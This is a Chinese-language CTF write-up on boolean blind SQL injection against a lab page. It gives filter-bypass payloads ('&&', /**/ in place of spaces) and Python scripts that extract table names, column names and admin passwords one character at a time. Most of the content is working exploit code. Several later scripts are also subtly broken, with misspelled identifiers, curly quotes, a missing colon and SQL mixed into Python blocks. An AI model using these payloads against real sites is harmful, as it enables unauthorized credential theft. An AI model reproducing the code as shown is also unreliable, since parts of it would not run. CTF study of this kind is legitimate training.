# ==布尔盲注CTF解题方法==

步骤：

1.确定注入点

2.对注入点测试，获取原始注入利用语句

3.Python编写代码自动注入



注入点 id 使用 and 1=1 和 and 1=2 由于过滤了 and 关键字，所以无法探测出是否存在SQL注入。此时可以使用 && 替换 and 关键字，绕过过滤

```
?id = 1%26%261  
%26是&的UR编码
?id=1%26%260

注意：由于&默认会被识别为参数链接的符号，没有其他作用，所以在Burpsuite中必须对&进行URL编码
```

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20230831160058396.png" alt="image-20230831160058396" style="zoom:200%;" />



对注入点测试，获取原始注入利用语句

```sql
select * from person where id = -1 or ord(mid((select table_name from information_schema.tables where table_schema in (database()) limit 1 offset 0) from 1 for 1)) in (97);

-1/**/or/**/ord(mid((select/**/table_name/**/from/**/information_shcema.tables/**/where/**/table_shcema/**/in/**/(database())/**/limit/**/1/**/offset/**/0)/**/from/**/1/**/for/**/1))/**/in/**/(97);
```



**Python编写代码自动化注入**

表名获取

```python
import requests

chars ="}{-0123456789abcdefghijklmnopqrstuvwxyz"
url ="http://192.168.8.102/01SQL/05Boolean-CTF/index.php"
for n in range(0,2):
	table_name = ''
	for i in range(1,50):
		for char in chars:
			params = {
"id":"-1/**/or/**/mid((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema/**/in/**/(database())/**/limit/**/1/**/offset/**/"+str(n)+")/**/from/**/"+str(i)+"/**/for/**/1)/**/in/**/('"+str(char)+"')"
			}
			r = requests.get(url=url,params=params)
			#print(r.request.url)
			if len(r.text) == 1764:
				table_name += char
	print(table_name)
```

![image-20230831171243206](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230831171243206.png)



字段名获取

```python
-1/**/or/**/mid((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table.name/**/in/**/('admin')/**/limit/**/1/**/0ffset/**/0)/**/from/**/1/**/for/**/1)/**/in/**/('i');

for n in range(0,3):
	column_name = ""
	for i in range(1,50):
		for char in chars
			params = {
"id":"'-1/**/or/**/mid((select/**/column_name/**/from/**/information_schema.columns/**/where/**/tablename/**/in/**/('admin')/**/limit/**/1/**/offset/**/"+Strin)+")/**/from/**/"+str/i)+"/**/for/**/1)/**/in/**/('"+str(char)+”');"
			}
			r = requests .get(url=url,params=params)
			
			if len(r.text) ==1764:
				column_name += char
print(column_name)
```

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20230831171331712.png" alt="image-20230831171331712" style="zoom:200%;" />



字段值获取

```python
-1/**/or/**/mid( select/**/pasSword/**/from/**/admin/**/limit/**/1/**/offset/**/0)/**/from/**/1/**/for/**/1)/**/in/**/('f');

for n in range(0,11):
	password_value = ''
	for i in range(1,50):
		for char in chars:
			params = {
'id' :
"-1/**/or/**/mid((select/**/password/**/from/**/admin/**/limit/**/1/**/offset/**/"+str(n)+")/**/from/**/"+str(i)+"/**/for/**/1)/**/in/**/('"+char+”')"
            }
           r = requests .get(url=url,params=params)
        	if len(r.text) == 1764:
                password_value +=char
print(password_value)
```

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20230831170946267.png" alt="image-20230831170946267" style="zoom:200%;" />



**总结：1.python实现自动化布尔注入2.布尔注入原理深入了解**